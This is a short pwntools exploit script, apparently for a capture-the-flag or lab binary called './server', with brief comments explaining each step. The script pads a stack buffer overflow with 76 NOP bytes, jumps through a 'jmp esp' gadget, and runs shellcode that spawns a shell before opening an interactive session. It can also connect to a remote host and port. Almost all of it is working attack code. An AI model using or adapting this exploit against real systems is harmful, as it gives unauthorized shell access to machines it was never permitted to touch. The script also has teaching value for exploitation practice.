# We needed the 'jmp esp' becaus we dont know where in the stack to execute the shellcode



from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


exe = './server'
elf = context.binary = ELF(exe, checksec=False)


io = start()

# Padding
offset = 76

# Convert to machine code
jmp_esp = asm('jmp esp')

# Searches for the address of the instruction in machine code
jmp_esp = next(elf.search(jmp_esp))



# Gadget address found using ropper
#jmp_esp = p32(0x0804919f)	



# Get a shell
shellcode = asm(shellcraft.sh())

# Exit
shellcode += asm(shellcraft.exit())


# Build payload
payload = flat(
	asm('nop') * offset,		# Padding uses NOP instruction because it is safer in case the jump does not land exactly on the first byte of shellcode
	jmp_esp,
	asm('nop') * 16,			# If the jump lands anywhere between the 16 bytes of NOP sled, it will still execute the shellcode safely
	shellcode
)

# Exploit
io.sendlineafter(b':', payload)

io.interactive()
